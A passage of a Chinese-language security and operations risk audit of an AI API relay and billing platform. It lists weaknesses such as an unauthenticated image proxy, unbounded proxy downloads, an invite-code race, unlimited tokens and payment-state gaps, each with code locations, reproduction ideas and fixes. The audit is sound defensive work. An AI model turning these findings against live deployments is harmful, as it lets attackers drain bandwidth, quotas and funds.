- 优先级：P2
- 当前状态：已确认订阅维护缺少数据库级租约和健康审计，尚未修复。

### 风险 54：视频结果代理没有响应大小上限，data URL 会整段解码进内存，远端视频会无界占用带宽

- 标题：`VideoProxy` 对远端视频使用 `io.Copy` 直接转发，对 `data:` URL 使用 `base64.DecodeString` 一次性解码；没有 Content-Length 上限、下载限速或最大视频大小
- 影响范围：视频结果代理、服务端内存、出站带宽、反向代理连接、用户 token 可用性、恶意或异常上游结果 URL
- 触发条件：任务结果 URL 指向超大文件、无限流、慢速响应或受控站点；Vertex/Gemini 返回超大 base64 data URL；用户反复请求视频内容接口
- 涉及文件/函数：
  - `router/video-router.go:10-17`：`/v1/videos/:task_id/content` 允许 TokenOrUserAuth 访问
  - `controller/video_proxy.go:124-129`：`data:` URL 直接进入 `writeVideoDataURL`
  - `controller/video_proxy.go:174-204`：`writeVideoDataURL` 对 payload 整体 `base64.DecodeString`，没有大小限制
  - `controller/video_proxy.go:146-169`：远端 URL 返回 200 后直接 `io.Copy(c.Writer, resp.Body)`，没有 `LimitReader` 或 Content-Length 校验
  - `controller/video_proxy.go:132-137`：有 SSRF 校验，这是正向证据，但不覆盖资源消耗上限
- 可能后果：单个请求可占用大量内存或长时间占用出站带宽；多个用户或脚本重复请求同一结果 URL 会放大平台流量成本。若上游结果 URL 被异常/恶意响应控制，还可能造成应用进程 OOM 或 worker 被长连接拖住。
- 复现思路：把任务结果 URL 指向一个返回大文件或不结束流的测试服务，调用视频 content 接口；观察服务端没有提前按大小拒绝，连接持续占用资源。对 data URL 构造大 base64 字符串，观察内存占用。
- 修复建议：为视频代理设置最大 Content-Length、最大传输字节数、读超时、带宽/并发限制和缓存策略；data URL 解码应流式处理并设硬上限。超过阈值应返回明确错误并记录脱敏审计。
- 优先级：P2
- 当前状态：已确认视频代理缺少大小/带宽硬限制，尚未修复。

### 风险 58：MJ 派生动作复用原任务渠道发请求，但消费日志和渠道成本可能记到当前选中的渠道

- 标题：change/video/image-seed 等动作会把请求切到原任务渠道和 key，但 `relayInfo.ChannelId` 未同步更新；扣费日志和 `UpdateChannelUsedQuota` 使用的仍可能是本次路由选中的渠道
- 影响范围：MJ UPSCALE/VARIATION/VIDEO/SIMPLE_CHANGE 等派生动作、渠道成本统计、渠道利润率、自动禁用/运营报表
- 触发条件：用户对历史 MJ 任务执行派生动作；当前请求先被分发到渠道 A，但原任务属于渠道 B；代码将请求 header/base_url 切到 B，但 relayInfo 仍保留 A
- 涉及文件/函数：
  - `relay/mjproxy_handler.go:458-477`：找到原任务后设置 `c.Set("base_url", channel.GetBaseURL())`、`c.Set("channel_id", originTask.ChannelId)` 和 Authorization，但未更新 `relayInfo.ChannelId`
  - `relay/mjproxy_handler.go:533-553`：扣费日志和 `model.UpdateChannelUsedQuota(relayInfo.ChannelId, priceData.Quota)` 使用 `relayInfo.ChannelId`
  - `relay/mjproxy_handler.go:286-305`：image-seed 也按原任务渠道发起上游请求
- 可能后果：上游成本发生在原任务渠道 B，本地却把消耗记到渠道 A；运营会误判渠道 A/B 的成本和毛利，后续调度、禁用和价格决策偏离真实账单。
- 复现思路：让用户有一个属于渠道 B 的 MJ 成功任务，再发起派生动作并让路由初始命中渠道 A；观察上游请求是否打到 B，同时消费日志和渠道 used_quota 是否记录 A。
- 修复建议：一旦派生动作锁定原任务渠道，应同步更新 `relayInfo.ChannelId`、`ChannelType`、`ChannelBaseUrl`、`ApiKey` 和 ChannelMeta；成本统计以实际上游渠道为准。
- 优先级：P2
- 当前状态：已确认派生动作存在请求渠道与计费统计渠道分叉的代码路径，尚未修复。

### 风险 59：MJ 图片代理无鉴权且没有响应大小上限，任何拿到 `mj_id` 的人都可消耗服务器带宽拉取图片

- 标题：`/mj/image/:id` 在 MJ TokenAuth 之前注册，公开访问；代理远端图片时只做 SSRF 校验，不做用户归属、签名、Content-Length 上限或流量限制
- 影响范围：Midjourney 图片结果、服务器出站带宽、图片隐私、公开任务 ID、代理资源
- 触发条件：`setting.MjForwardUrlEnabled` 开启后返回的图片 URL 指向 `/mj/image/:id`；任意人拿到 `mj_id` 或转发链接；远端图片很大或响应很慢；脚本反复请求
- 涉及文件/函数：
  - `router/relay-router.go:216-218`：`GET /mj/image/:id` 在 `relayMjRouter.Use(TokenAuth(), Distribute())` 之前注册
  - `relay/mjproxy_handler.go:29-37`：只按 `MjId` 查询任务，没有校验当前用户或 token
  - `relay/mjproxy_handler.go:53-60`：请求前做 SSRF 校验，这是正向证据
  - `relay/mjproxy_handler.go:68-84`：非 200 时 `io.ReadAll` 读取错误体，200 时 `io.Copy` 无上限转发图片
  - `relay/mjproxy_handler.go:142-150`：开启转发时会把任务图片 URL 包装成服务器 `/mj/image/<mj_id>`
- 可能后果：图片链接等同公开资源，任务 ID 泄露后无需登录即可访问图片；大文件或慢响应会持续占用服务器连接和出站带宽。该问题不直接充值，但会造成隐私和运营成本风险。
- 复现思路：开启 MJ 图片转发，拿到任意用户任务返回的 `/mj/image/:id`，在无 Authorization 情况下请求；再把远端 `ImageUrl` 指向大文件测试服务，观察服务端无大小限制地转发。
- 修复建议：图片代理增加签名短链或 Token/UserAuth，并校验任务归属；设置最大 Content-Length、最大传输字节数、读超时和缓存；错误体也要限长读取。公共图片如需保留，应显式标注为公开 CDN 语义。
- 优先级：P2
- 当前状态：已确认 MJ 图片代理无鉴权且缺少资源上限，尚未修复。

### 风险 63：支付合规确认由多次单项设置写入组成，缺少原子性和完整性校验

- 标题：`ConfirmPaymentCompliance` 逐个调用 `model.UpdateOption` 写入五个合规字段；任一中途失败或 DB 写入被忽略，都可能留下半确认状态
- 影响范围：支付开关启用前置条件、邀请/返利额度合规门槛、合规审计证据、支付配置启用流程、多实例一致性
- 触发条件：根管理员确认支付合规时数据库写入部分失败、进程中断、实例间同步延迟；或 `UpdateOption` 返回成功但实际 DB `Save` 失败
- 涉及文件/函数：
  - `controller/payment_compliance.go:30-37`：该操作要求 dashboard session，不允许 access token，这是正向保护证据
  - `controller/payment_compliance.go:53-66`：五个 `payment_setting.compliance_*` 字段用 map 循环逐项 `model.UpdateOption`
  - `setting/operation_setting/payment_setting.go:5-14`：合规确认字段包含 confirmed、terms_version、time、user、ip
  - `setting/operation_setting/payment_setting.go:33-36`：支付合规判断只要求 confirmed=true 且 terms_version 匹配
  - `model/option.go:210-223`：单项 UpdateOption 忽略 DB 写入错误并立即更新内存
- 可能后果：运行时可能只看到 `confirmed=true` 和当前 terms version，支付相关设置被放行，但确认人、时间、IP 没有可靠落库；其他实例或重启后状态又变化。运营审计需要证明“谁在何时确认”时证据链不完整。
- 复现思路：本地让第五个合规字段写入失败，或让 DB Save 静默失败；观察接口可能已经更新部分内存状态，`IsPaymentComplianceConfirmed()` 可能与数据库审计字段不一致。
- 修复建议：合规确认必须使用 `UpdateOptionsBulk` 或专用事务一次提交，并在提交后重新读取验证五个字段完整一致。合规状态建议使用单条结构化记录或不可变审计表，不应只依赖可覆盖的 options key。
- 优先级：P2
- 当前状态：已确认合规确认缺少原子提交和提交后完整性校验，尚未修复。

### 风险 65：多实例配置同步只靠周期性轮询，支付和计费配置可能在窗口期内分裂执行

- 标题：配置变更只立即影响当前实例，其他实例等待 `SyncOptions(common.SyncFrequency)` 轮询数据库；没有版本号、广播、租约或强一致读屏障
- 影响范围：多实例部署下的支付回调、充值下单、模型计费、渠道禁用、安全开关、SSRF 防护、登录注册限制、管理员配置回滚
- 触发条件：集群有多个 API 实例；管理员修改价格/支付密钥/SSRF/注册登录/渠道自动禁用等设置；请求在同步窗口内落到不同实例
- 涉及文件/函数：
  - `main.go:80`：启动时输出 `common.SyncFrequency`
  - `main.go:101`：后台启动 `go model.SyncOptions(common.SyncFrequency)`
  - `model/option.go:202-208`：同步逻辑是固定间隔 sleep 后 `loadOptionsFromDatabase`
  - `model/option.go:192-199`：从 DB 加载选项时逐项更新，出错只写系统日志继续
  - `model/option.go:259-585`：单项更新会逐项改变全局变量，没有配置版本或批次边界
- 可能后果：支付下单实例使用新单价，回调实例仍用旧单价；一个实例关闭 SSRF 防护，另一个实例仍开启；模型价格或 `QuotaPerUnit` 在不同实例上不一致，造成同一订单/同一请求在不同入口产生不同资产结果。轮询期间的账务差异难以通过后续同步自动修复。
- 复现思路：本地启动两个实例或模拟两个进程，修改 `QuotaPerUnit`/`Price` 后立即分别调用充值完成或渠道余额换算；观察同步前两边计算结果不同。
- 修复建议：配置表增加版本号和更新时间；高风险配置修改后通过 Redis pub/sub、数据库通知或配置中心广播到所有实例，并要求支付/计费路径读取同一配置版本。批量配置应用应有 staging -> validate -> commit -> broadcast -> ack 流程，未确认同步前禁止继续变更同类高风险项。
- 优先级：P2
- 当前状态：已确认多实例配置同步为周期轮询且缺少版本/广播机制，尚未修复。

### 风险 70：部分后台写操作使用 GET 或普通 AdminAuth，容易被运维脚本、预取、误点和 token 泄露放大为运营事故

- 标题：渠道测试、余额更新、模型拉取、Ollama 删除/拉取、性能清理、日志删除等运营动作分散在后台路由中，只有个别密钥查看接口加了 step-up
- 影响范围：渠道状态、渠道余额、自动禁用、上游模型列表、Ollama 模型、磁盘缓存/性能统计、日志保留、运营排障数据
- 触发条件：管理员误点、监控脚本复用管理 token、浏览器/代理预取 GET 链接、access token 泄露后批量调用后台维护接口
- 涉及文件/函数：
  - `router/api-router.go:241`：查看渠道 key 使用 `RootAuth + CriticalRateLimit + SecureVerificationRequired`，这是正向保护证据
  - `router/api-router.go:242-256`：渠道测试、余额更新、删除/批量删除、fetch models 等接口多数只有 `AdminAuth`，部分变更性动作使用 GET
  - `router/api-router.go:263-265`：Ollama pull/delete 也在 `AdminAuth` 分组下
  - `router/api-router.go:217-225`：性能 reset、GC、日志清理在 `RootAuth` 分组下，但未见 step-up
  - `middleware/auth.go:176-185`：这些路由的 Admin/Root 鉴权可被 access token 满足
- 可能后果：一次泄露的后台 token 或脚本误调用可批量触发渠道测试、余额更新和自动禁用，影响线上可用性；日志/性能数据被清理会削弱事故追踪；Ollama 模型操作可能造成本地模型不可用或资源占用。
- 复现思路：本地列举 `router/api-router.go` 中 AdminAuth/RootAuth 的写操作，使用 access token 调用测试环境的余额更新或性能 reset，确认没有额外 step-up/原因字段/幂等保护。
- 修复建议：后台写操作统一改为非 GET；按风险等级增加 `SecureVerificationRequired`、`CriticalRateLimit`、reason/confirm 字段和审计日志。对“查看密钥、修改支付/价格、补单、MFA 重置、删除渠道/日志、模型删除、全量测试/余额更新”等建立统一高危中间件。
- 优先级：P2
- 当前状态：已确认后台写操作保护强度不一致，只有渠道 key 查看明确使用 step-up，尚未修复。

### 风险 74：验证码存储在单进程内存，且限流按 IP，不适合多实例和高可靠账号恢复

- 标题：邮箱验证和密码重置 token 只存在 `verificationMap` 进程内存；多实例、重启或负载均衡会导致验证码不可用或行为不一致
- 影响范围：注册邮箱验证、邮箱绑定、密码重置、客服恢复体验、验证码请求风控、集群部署
- 触发条件：多实例部署未做粘性会话；发送验证码请求落到实例 A，验证/重置请求落到实例 B；实例重启；攻击者通过多 IP 触发验证码发送；Redis 未启用时限流只在本进程生效
- 涉及文件/函数：
  - `common/verification.go:21-24`：验证码 map、最大大小和有效期都是进程内变量
  - `common/verification.go:35-45`：验证码注册写入本地 map
  - `common/verification.go:47-56`：验证码校验只读本地 map
  - `middleware/rate-limit.go:21-31`、`67-87`：限流 key 主要由 `mark + ClientIP` 组成；未启 Redis 时为单进程内存限流
  - `router/api-router.go:41-43`：邮箱验证、密码重置发送和重置接口依赖这些验证码/限流
- 可能后果：用户明明收到验证码或重置链接，但下一步请求被路由到其他实例后失败；重启会让所有未使用链接失效。攻击/误用场景下，按 IP 的验证码限流对分布式来源效果有限，容易造成邮件发送成本和客服压力。
- 复现思路：本地启动两个实例或模拟两个独立进程，在实例 A 注册验证码，在实例 B 调用校验；观察校验失败。
- 修复建议：验证码/token 存入 Redis 或数据库，带 purpose、user/email、过期时间、尝试次数、已消费状态和创建 IP；限流同时按 IP、邮箱、用户 ID、设备指纹和全局发送量计算。多实例部署必须共享验证码状态。
- 优先级：P2
- 当前状态：已确认验证码和未启 Redis 时限流都依赖进程内存，尚未修复。

### 风险 80：普通用户创建邀请码的每日上限检查与创建不在同一原子操作内，并发请求可能超过 `InviteCodeDailyLimit`

- 标题：`CreateSelfInviteCodes` 先统计今天创建数量，再调用 `CreateInviteCodes` 插入；两个步骤之间没有用户级锁或条件计数更新
- 影响范围：普通用户邀请码每日配额、邀请制注册名额、邀请奖励、批量拉新活动风控
- 触发条件：普通用户同时发起多个创建邀请码请求；每个请求都在插入前看到相同 `createdToday`；`InviteCodeDailyLimit` 较小但并发请求各自创建多个邀请码
- 涉及文件/函数：
  - `router/api-router.go:95-96`：普通用户可访问自助邀请码列表和创建接口
  - `controller/invite.go:130-141`：普通用户创建前调用 `CountInviteCodesCreatedToday` 检查剩余额度
  - `model/invite_code.go:127-132`：每日统计只是普通 count 查询
  - `controller/invite.go:154-169`：检查通过后调用 `model.CreateInviteCodes`
  - `model/invite_code.go:70-124`：创建邀请码的事务只包插入，不包含每日配额原子扣减
- 可能后果：普通用户可在并发下创建超过每日上限的邀请码，扩大注册入口和邀请奖励攻击面。与风险 76/77 叠加时，邀请码运营限制会进一步失真。
- 复现思路：本地设置 `InviteCodeDailyLimit=5`，对同一普通用户并发发起多个 `count=5` 的创建请求；观察最终创建数量是否超过 5。
- 修复建议：为用户每日邀请码配额建立独立计数表，使用原子 `UPDATE ... WHERE used + requested <= limit`；或在邀请码创建事务中对用户/配额行加真实行锁。接口层增加用户级 rate limit 和幂等键。
- 优先级：P2
- 当前状态：已确认自助邀请码每日上限是“先查后插”的非原子流程，尚未修复。

### 风险 85：普通用户可创建或更新永不过期、无限 token，容易把一次泄露变成无预算上限的长期成本风险

- 标题：`AddToken`/`UpdateToken` 接受前端传入的 `UnlimitedQuota` 和 `ExpiredTime=-1`；非无限 token 才校验 remain quota 上限，用户可自行去掉 token 层预算
- 影响范围：用户自建 token、客户/员工分发 token、泄露 token 成本控制、预算隔离、长期自动化脚本
- 触发条件：普通用户创建 token 时设置 `unlimited_quota=true`、`expired_time=-1`；或把有限 token 更新为无限 token；该 token 泄露或被分发给第三方
- 涉及文件/函数：
  - `controller/token.go:167-189`：创建 token 时只有非无限 token 才校验 `RemainQuota` 非负和上限
  - `controller/token.go:210-224`：`UnlimitedQuota`、`ExpiredTime`、`Group`、`CrossGroupRetry` 等来自用户请求并保存
  - `controller/token.go:250-302`：更新 token 同样允许修改 `UnlimitedQuota` 和 `ExpiredTime`
  - `model/token.go:22-24`：`ExpiredTime=-1` 表示永不过期，`UnlimitedQuota` 是独立布尔字段
  - `service/pre_consume_quota.go:47-63`、`service/billing_session.go:293-300`：无限 token 在信任额度判断中可跳过 token 预算约束
- 可能后果：用户分发给下游的 token 没有自身额度/时间上限；一旦泄露，只能依赖用户总余额、订阅或人工发现来止损。与风险 83/84 叠加时，删除或扣减还可能延迟生效。
- 复现思路：本地普通用户创建 `unlimited_quota=true`、`expired_time=-1` 的 token，再请求高频模型调用，观察 token 层 remain quota 是否不限制。
- 修复建议：默认禁止普通用户创建无限 token，或要求显式高危确认和过期时间；企业/管理员可配置最大 token 有效期和最大 token 预算。前端显示“无限 token 等同无预算上限”，后端强制最小权限。
- 优先级：P2
- 当前状态：已确认普通 token 创建/更新允许无限额度和永不过期组合，尚未修复。

### 风险 88：`auto` 分组初始选渠时即使未开启 `CrossGroupRetry`，当前 auto group 无可用渠道也会继续尝试后续 auto group

- 标题：`CacheGetRandomSatisfiedChannel` 在 `channel == nil` 时总是推进 `AutoGroupIndex` 并继续循环，`crossGroupRetry` 只影响重试耗尽后的切组
- 影响范围：auto group 路由、成本分层、灰度渠道、低价优先组、不可用渠道降级、高价备用组
- 触发条件：token group 为 `auto`；用户可用 auto groups 中前置分组没有该模型可用渠道或临时不可用；token 的 `CrossGroupRetry` 为 false；后续 auto group 存在可用渠道
- 涉及文件/函数：
  - `service/channel_select.go:89-99`：auto group 选择时读取 `ContextKeyTokenCrossGroupRetry`
  - `service/channel_select.go:106-129`：当前分组无渠道时无条件设置下一个 `AutoGroupIndex`、重置 retry 并继续尝试
  - `service/channel_select.go:137-148`：`crossGroupRetry` 只控制当前分组优先级耗尽后的下一次重试切组
  - `service/group.go:44-53`：auto group 来源是用户可用分组与全局 AutoGroups 的交集
- 可能后果：运营以为关闭 `CrossGroupRetry` 后请求会被限制在第一个 auto group 或不会跨成本组降级，但实际在“当前组无渠道”的初始选择阶段仍可能落到后续高成本/备用组。渠道缺失、模型迁移或缓存短暂不一致时，成本路由可能和配置预期不一致。
- 复现思路：本地设置 auto groups 为 `cheap,expensive`，关闭 token `CrossGroupRetry`；让 `cheap` 对目标模型没有可用渠道，`expensive` 有可用渠道；请求该模型，观察是否仍选择 `expensive`。
- 修复建议：明确 `CrossGroupRetry` 的语义。如果它应禁止跨组，则在初始 `channel == nil` 时直接返回无渠道；如果当前行为是设计预期，应在 token 和 auto group 配置界面写明“无渠道时仍会继续查找后续 auto group”，并增加成本组降级日志/告警。
- 优先级：P2
- 当前状态：已确认初始无渠道场景会继续尝试后续 auto group，尚未修复或补充配置说明。

### 风险 95：SSE 扫描器把未收到 `[DONE]` 的 EOF 视为正常结束，早断/截断流可能被当成功请求结算

- 标题：`StreamEndReasonEOF` 被 `IsNormalEnd` 判为正常；普通流 handler 在 EOF 后继续用已收到文本本地估算 usage
- 影响范围：OpenAI chat/completions 流、Responses 流、图片流、上游连接早断、代理超时、客户端看到半截回答、消费日志状态
- 触发条件：上游 SSE 连接在发送 `[DONE]` 或 completed 事件前断开；scanner 没有报错，只是循环结束；handler 已收到部分 delta 或没有 usage
- 涉及文件/函数：
  - `relay/helper/stream_scanner.go:269-282`：只有收到 `[DONE]` 才设置 `done`，scanner 循环自然结束时设置 `eof`
  - `relay/common/stream_status.go:88-94`：`StreamEndReasonEOF` 被视为 normal end
  - `relay/channel/openai/relay-openai.go:183-190`：OpenAI chat 流未含 usage 时用 `ResponseText2Usage` 本地估算并继续返回 usage
  - `relay/channel/openai/relay_responses.go:133-149`：Responses 流也会在缺 usage 时用已收到文本和预估 prompt 结算
  - `service/text_quota.go:374-429`：后续按 usage 执行结算，settle 错误也只记录日志
- 可能后果：上游早断导致用户只收到半截内容，但系统把 EOF 当正常流结束并按本地估算扣费；如果无 `[DONE]` 也没有 completed usage，日志中只有 stream status，缺少明确“上游截断/可争议扣费”状态。
- 复现思路：本地 mock SSE 上游发送若干 `data:` delta 后直接关闭连接，不发送 `[DONE]`；观察 `StreamStatus.EndReason` 是否为 `eof`，消费日志是否按本地估算扣费且没有错误退款。
- 修复建议：区分“完整 EOF”和“未见终止标记的 EOF”。对 OpenAI chat 至少要求 `[DONE]` 或可验证 finish_reason；对 Responses 要求 `response.completed` 或明确成功终态。早断时记录 `partial_stream`，按配置决定不扣、只扣 prompt、只扣已输出部分，或进入人工争议队列。
- 优先级：P2
- 当前状态：已确认 EOF 被视为 normal end，尚未区分截断流。

### 风险 101：渠道 used_quota 批量更新为内存队列 best-effort，进程退出或写库失败会造成渠道成本统计少记

- 标题：开启 `BatchUpdateEnabled` 后 `UpdateChannelUsedQuota` 只把增量放入进程内 map；批量落库失败只写系统日志，且没有持久化重试队列
- 影响范围：渠道成本统计、渠道利润分析、自动成本报表、异常成本追踪、渠道余额/消耗对账、运营结算
- 触发条件：系统开启 batch update；大量 relay 成功调用后只进入内存队列；进程在 flush 前重启/崩溃；或 `updateChannelUsedQuota` 落库失败；系统继续运行但未补偿丢失增量
- 涉及文件/函数：
  - `service/text_quota.go:423-425`、`service/quota.go:346-347`、`service/violation_fee.go:131-132`：成功消费和违规扣费都会更新 channel used quota
  - `model/channel.go:855-860`：batch 模式下只调用 `addNewRecord(BatchUpdateTypeChannelUsedQuota, id, quota)` 后返回
  - `model/utils.go:23-31`：batch update store 是进程内 map
  - `model/utils.go:33-39`：后台 goroutine 定时 flush
  - `model/utils.go:69-75`：flush 开始时先把内存 map 清空并换新
  - `model/utils.go:78-91`：channel used quota 落库失败只写 `SysLog`，没有把增量放回队列
  - `model/channel.go:863-866`：实际 DB 更新失败也只写系统日志
- 可能后果：用户已经被扣费、请求日志已记录，但渠道 `used_quota` 少记。运营侧按渠道统计成本和利润会偏低；渠道异常消耗或亏损可能无法及时发现。多实例部署时每个实例的内存队列独立，重启丢失窗口更大。
- 复现思路：本地开启 `BatchUpdateEnabled`，完成一次会更新渠道用量的请求后，在 batch interval 前终止进程；重启后检查用户/日志已有消费但 channel `used_quota` 未增加。或模拟 `updateChannelUsedQuota` 失败，观察增量是否丢失。
- 修复建议：渠道用量增量应写持久化流水或可靠队列；flush 失败要把增量放回队列并报警。成本统计应以消费日志/账务流水为权威，channel.used_quota 作为可重建缓存字段，定期从日志重算对账。
- 优先级：P2
- 当前状态：已确认渠道 used_quota 批量更新为内存 best-effort，尚未修复。

### 风险 106：Waffo 支付方式配置解析失败会静默回退默认方式，且自定义方式缺少后端白名单校验

- 标题：`WaffoPayMethods` 直接从 `OptionMap` 解析，失败时返回默认 Card/Apple/Google；保存侧只序列化前端数组，不校验支付方式枚举、重复项、空值和图标大小来源
- 影响范围：Waffo 支付方式展示、用户选择的 pay method、支付渠道可用性、运营关闭某支付方式后的真实后端行为、支付失败率
- 触发条件：Root 保存非法 `WaffoPayMethods` JSON；前端/脚本写入空字段、重复项、未知 `payMethodType/payMethodName`；运营尝试删除某些默认方式但配置解析失败；用户用旧客户端传 `pay_method_type/pay_method_name`
- 涉及文件/函数：
  - `setting/payment_waffo.go:26-40`：`GetWaffoPayMethods` 解析失败或空字符串时返回 `DefaultWaffoPayMethods`
  - `constant/waffo_pay_method.go:11-15`：默认方式包含 Card、Apple Pay、Google Pay
  - `controller/topup_waffo.go:156-185`：后端按索引或旧字段从 `GetWaffoPayMethods()` 里解析支付方式；如果配置解析失败，用户选择会落到默认列表
  - `controller/topup_waffo.go:186-264`：不传支付方式时允许 Waffo 自动选择；传入的 `PayMethodType/Name` 来自配置本身
  - `model/option.go:580-583`：`WaffoPayMethods` 只保存在 `OptionMap`，没有额外内存变量或校验
  - `web/default/src/features/system-settings/integrations/waffo-settings-section.tsx:88-94`、`104-110`：前端解析失败显示空数组
  - `web/default/src/features/system-settings/integrations/waffo-settings-section.tsx:113-132`：保存时直接 `JSON.stringify(payMethods)`
  - `web/default/src/features/system-settings/integrations/waffo-settings-section.tsx:171-181`：新增方式只要求 name 非空，未校验支付方式枚举
- 可能后果：后台 UI 可能显示为空或管理员以为某些方式已禁用，但后端解析失败时又暴露默认支付方式；或者自定义未知 pay method 被保存后传给 Waffo，导致大量支付拉起失败。该问题不直接加额度，但会造成支付入口与运营配置不一致，影响充值转化和支付事故定位。
- 复现思路：本地把 `WaffoPayMethods` 写成非法 JSON 或缺少必要字段，调用 `/api/user/topup/info` 和 `/api/user/waffo/pay`；观察前端配置认知、返回的 `waffo_pay_methods` 和后端实际可选方式是否一致。
- 修复建议：保存 `WaffoPayMethods` 时做后端 schema 校验：必须是数组，name/icon/type/name 字段长度受限，`payMethodType/payMethodName` 必须属于允许枚举或由明确的“高级自定义”开关放行；解析失败应 fail closed 返回空并禁用 Waffo 支付，而不是静默回退默认方式。配置变更记录审计 diff。
- 优先级：P2
- 当前状态：已确认 Waffo 支付方式配置缺少后端业务校验且解析失败回退默认方式，尚未修复。

### 风险 109：Creem checkout 创建失败后，本地普通充值和订阅订单已写入 pending 但不会标记失败

- 标题：Creem 采用“先写本地订单，再调用第三方 checkout”的顺序；第三方调用失败时只返回错误，没有回滚或失败化本地 pending 记录
- 影响范围：Creem 普通充值订单、Creem 订阅订单、用户订单历史、运营对账、异常订单清理、客服补单判断
- 触发条件：Creem API Key 错误、产品 ID 无效、网络超时、Creem API 返回非 2xx、响应缺少 `checkout_url`；本地订单插入成功但 `genCreemLink` 失败
- 涉及文件/函数：
  - `controller/topup_creem.go:107-123`：普通充值先插入 pending `TopUp`
  - `controller/topup_creem.go:125-130`：`genCreemLink` 失败时直接返回“拉起支付失败”，未更新刚插入的 `TopUp.Status`
  - `controller/subscription_payment_creem.go:80-95`：订阅购买先插入 pending `SubscriptionOrder`
  - `controller/subscription_payment_creem.go:114-118`：订阅 `genCreemLink` 失败时直接返回错误，未更新订阅订单状态
  - `controller/topup_creem.go:375-457`：`genCreemLink` 可能因缺 API key、HTTP 请求失败、非 2xx、JSON 解析失败或缺 checkout url 返回错误
- 可能后果：用户看到支付拉起失败，但数据库留下 pending 订单；运营对账会出现未曾跳转支付的悬挂订单，可能被误判为支付失败待补单。大量配置错误或网络故障会堆积 pending 记录，影响统计、客服排障和后续异常订单清理。
- 复现思路：配置无效 `CreemApiKey` 或无效 `productId`，发起普通 Creem 充值或订阅购买；接口返回“拉起支付失败”，查询 `top_ups` 或 `subscription_orders` 可见对应 `trade_no` 仍为 pending。
- 修复建议：将本地订单创建和 checkout 创建纳入明确状态机。可选方案：先创建本地 `initiating` 订单，checkout 成功后转 `pending_payment`；失败时转 `failed` 并保存错误码。或者在 `genCreemLink` 失败后立即用事务更新为 failed/canceled。订单列表和后台应区分“未拉起支付”和“已拉起待回调”。
- 优先级：P2
- 当前状态：已确认 Creem checkout 创建失败会留下 pending 悬挂订单，尚未修复。

### 风险 112：Stripe 设置页只提示订阅 `checkout.session.completed/expired`，但后端还依赖 async payment succeeded/failed 处理延迟支付

- 标题：后端已支持 Stripe delayed payment 的 `checkout.session.async_payment_succeeded/failed`，但后台配置提示仍只要求 completed/expired，运营可能漏配异步事件
- 影响范围：Stripe 普通充值、Stripe 订阅购买、SEPA/银行转账等延迟支付方式、pending/failed 订单清理、客服对账
- 触发条件：Stripe Checkout 使用异步支付方式；运营按后台提示只在 Stripe Dashboard 订阅 `checkout.session.completed` 和 `checkout.session.expired`；异步成功/失败事件未推送到本系统
- 涉及文件/函数：
  - `controller/topup_stripe.go:176-184`：后端实际处理 `checkout.session.async_payment_succeeded` 和 `checkout.session.async_payment_failed`
  - `controller/topup_stripe.go:201-205`：`checkout.completed` 中 `payment_status != paid` 时只等待异步结果，不入账
  - `controller/topup_stripe.go:210-255`：异步成功/失败分别完成订单或标记 failed
  - `web/default/src/features/system-settings/integrations/payment-settings-section.tsx:895-899`：新版后台只展示 completed 和 expired
  - `web/classic/src/pages/Setting/Payment/SettingsPaymentGatewayStripe.jsx:197`：classic 后台也只提示需要 completed 和 expired
- 可能后果：延迟支付成功后本地订单一直 pending，用户付款不到账；延迟支付失败后本地订单也不转 failed，客服和运营看到长时间 pending。若后续人工补单，可能因为缺少支付事件证据而误补或漏补。
- 复现思路：配置 Stripe 只推送 completed/expired，然后使用异步支付方式创建 checkout；`checkout.completed` 到达时 `payment_status` 为非 paid，本地等待 async succeeded/failed；由于后台未提示订阅该事件，本地订单停在 pending。
- 修复建议：更新两个后台配置提示，明确列出 `checkout.session.completed`、`checkout.session.expired`、`checkout.session.async_payment_succeeded`、`checkout.session.async_payment_failed`，并在 Stripe webhook 健康检查中记录最近收到的事件类型。也可以在后端增加 pending 超时巡检，对长时间 pending 的 Stripe Checkout 主动查询 session/payment_intent 状态。
- 优先级：P2
- 当前状态：已确认 Stripe webhook 配置提示与后端实际事件依赖不一致，尚未修复。

### 风险 118：删除单个兑换码和批量清理失效兑换码是物理删除，会丢失兑换审计证据

- 标题：兑换码被使用后只在原表记录 `used_user_id/redeemed_time`，批量清理 used/disabled/expired 会直接删除这些记录，没有独立兑换流水留存
- 影响范围：兑换码审计、客服排障、资产追踪、异常兑换调查、合规留存、批量清理操作
- 触发条件：管理员删除单个兑换码；或点击“清除失效兑换码”，删除所有 used、disabled、expired 的兑换码；后续需要追查某个用户通过哪个兑换码获得额度/套餐
- 涉及文件/函数：
  - `model/redemption.go:20-34`：兑换码表本身存储 `used_user_id`、`redeemed_time`，未看到独立 redemption usage 表
  - `model/redemption.go:237-252`：单个删除直接 `DB.Delete(redemption)`
  - `model/redemption.go:255-258`：批量清理 used/disabled/expired 兑换码
  - `controller/redemption.go:199-210`：清理接口直接返回删除行数
  - `web/default/src/features/redemption-codes/components/data-table-bulk-actions.tsx:115-130`：新版前端提示该操作不可恢复
  - `web/classic/src/hooks/redemptions/useRedemptionsData.jsx:255-263`：classic 也提供清除所有失效兑换码
- 可能后果：一旦清理，系统只剩普通日志文本，无法结构化查询兑换码 key、创建人、兑换人、兑换时间、兑换资产类型和额度/套餐。发生刷码、撞库、内部误发或用户争议时，运营无法完整还原资产来源。
- 复现思路：用户兑换一个套餐码，然后执行 `/api/redemption/invalid`；查询兑换码表已无该 key，后续只能依赖日志文本，无法按 key/used_user_id 做结构化追踪。
- 修复建议：新增 `redemption_usages` 或 `asset_grants` 表，兑换成功时不可变记录 key、redemption_id、user_id、type、quota/plan_id、redeemed_at、operator/source。删除兑换码时只软删除或归档，不删除使用流水；批量清理应支持导出和保留期策略。
- 优先级：P2
- 当前状态：已确认兑换码清理会删除审计主记录，尚未修复。

### 风险 121：手工额度调整只写文本管理日志，没有结构化资产流水，日志失败也不会阻断资产变更

- 标题：管理员加减/覆盖余额不创建 topup/asset_adjustment 记录，日志只含文本内容和 admin_info；`LOG_DB.Create` 失败只写系统日志，资产已经变更
- 影响范围：手工补偿、人工扣费、客服审计、资产对账、责任追踪、用户余额争议
- 触发条件：管理员执行 add/subtract/override；后续需要按用户、管理员、原因、旧值、新值、delta、工单号查询资产变更；或日志库短暂故障
- 涉及文件/函数：
  - `controller/user.go:956-992`：手工调额只在成功后调用 `RecordLogWithAdminInfo`
  - `model/log.go:109-130`：`RecordLogWithAdminInfo` 将 admin_info 存到 `Other`，但 `LOG_DB.Create` 失败只 `SysLog`，不回滚资产
